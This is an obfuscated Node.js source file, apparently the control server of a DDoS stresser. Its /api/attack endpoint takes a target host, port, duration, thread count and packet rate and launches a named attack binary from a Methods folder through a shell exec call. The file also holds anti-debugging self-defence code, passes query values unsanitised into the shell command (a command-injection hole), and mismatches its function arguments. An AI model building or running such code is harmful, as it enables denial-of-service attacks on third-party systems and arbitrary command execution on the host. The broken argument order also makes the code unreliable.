const q = function () {
  let R = true;
  return function (V, M) {
    const G = R ? function () {
      if (M) {
        const h = M.apply(V, arguments);
        M = null;
        return h;
      }
    } : function () {};
    R = false;
    return G;
  };
}();

(function () {
  q(this, function () {
    const R = new RegExp("function *\\( *\\)");
    const V = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
    const M = E('init');
    if (!R.test(M + 'chain') || !V.test(M + 'input')) {
      M('0');
    } else {
      E();
    }
  })();
})();

const express = require('express');
const { exec } = require('child_process');
const app = express();

function SendAttack(R, V, M, G, h, B, b, F) {
  h = h.replace(/\+/g, ' ');
  h = h.replace(/\[host]/g, '' + R).replace(/\[time]/g, '' + V).replace(/\[port]/g, '' + M).replace(/\[packet_size]/g, '' + b).replace(/\[threads]/g, '' + B).replace(/\[pps]/g, '' + F);
  exec('chmod 777 ./' + G + ' ; ./Methods/' + G + ' ' + h, (P, c, t) => {
    if (P) {}
  });
}

app.get('/api/attack', (R, V) => {
  const { host: M, port: G, time: h, method: B, format: b, threads: F, packet_size: P, pps: c } = R.query;
  SendAttack(M, G, h, B, b, F, P, c);
  V.send('Sent Attack');
});

app.listen(9999, () => {
  console.log('Server is ready');
});

function E(R) {
  function V(M) {
    if (typeof M === 'string') {
      return function (G) {}.constructor('while (true) {}').apply('counter');
    } else {
      if (('' + M / M).length !== 1 || M % 20 === 0) {
        ;(function () {
          return true;
        }).constructor('debugger').call('action');
      } else {
        ;(function () {
          return false;
        }).constructor('debugger').apply('stateObject');
      }
    }
    V(++M);
  }
  try {
    if (R) {
      return V;
    } else {
      V(0);
    }
  } catch (M) {}
}